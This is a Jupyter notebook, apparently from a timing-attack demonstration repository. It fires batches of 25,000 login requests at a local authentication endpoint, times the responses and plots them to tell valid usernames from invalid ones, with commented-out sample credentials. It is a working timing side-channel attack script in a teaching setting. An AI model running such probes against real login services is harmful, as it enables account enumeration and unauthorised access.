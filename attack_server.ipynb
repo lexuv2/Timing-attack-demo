{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as re\n",
    "from time import perf_counter_ns\n",
    "from multiprocessing import Pool\n",
    "import time\n",
    "from matplotlib import pyplot as plt\n",
    "import numpy as np\n",
    "\n",
    "url = 'http://localhost:5000/auth'\n",
    "batch_size = 25000\n",
    "threads = 16\n",
    "garbage_collector = 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def moving_average(data,window_size):\n",
    "    window = np.ones(int(window_size))/float(window_size)\n",
    "    return np.convolve(data, window, 'same')\n",
    "\n",
    "def reject_outliers(data, m = 2.):\n",
    "    data = np.array(data)\n",
    "    d = np.abs(data - np.median(data))\n",
    "    mdev = np.median(d)\n",
    "    s = d/mdev if mdev else np.zeros(len(d))\n",
    "    return data[s<m]\n",
    "def plot_data(data):\n",
    "    \n",
    "    plt.plot(data)\n",
    "    plt.title(f\"Average {np.average(data)}\")\n",
    "    plt.show()\n",
    "\n",
    "    rejected = reject_outliers(data,10)\n",
    "    plt.plot(rejected)\n",
    "    plt.title(f\"Average {np.average(rejected)}\")\n",
    "    plt.show()\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "def test_for_combination(login , password):\n",
    "    times = []\n",
    "    \n",
    "    for x in range(batch_size):\n",
    "        r = re.post(url, json={'username': login, 'password': password})\n",
    "        time_taken = r.elapsed.microseconds\n",
    "        times.append(time_taken)\n",
    "    return np.array(times)\n",
    "\n",
    "def test_for_combination_threaded(login , password):\n",
    "    sum = 0\n",
    "    with Pool(threads) as p:\n",
    "        for x in range(batch_size):\n",
    "            r = p.apply_async(re.post, args=(url,), kwds={'json': {'username': login, 'password': password}})\n",
    "            time_taken = r.get().elapsed.microseconds\n",
    "            sum += time_taken\n",
    "    return sum*threads / batch_size\n",
    "\n",
    "\n",
    "#print(\"good\",test_for_combination_threaded('admin', 'ping2024'))\n",
    "#print(\"good\",test_for_combination('admin', 'ping2024'))\n",
    "#print(\"bad\",test_for_combination_threaded('gueuhre', 'ping2a24'))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "times_good = test_for_combination('user400', 'password')\n",
    "times_bad = test_for_combination('admin', 'password')\n",
    "\n",
    "plot_data(times_good)\n",
    "plot_data(times_bad)\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
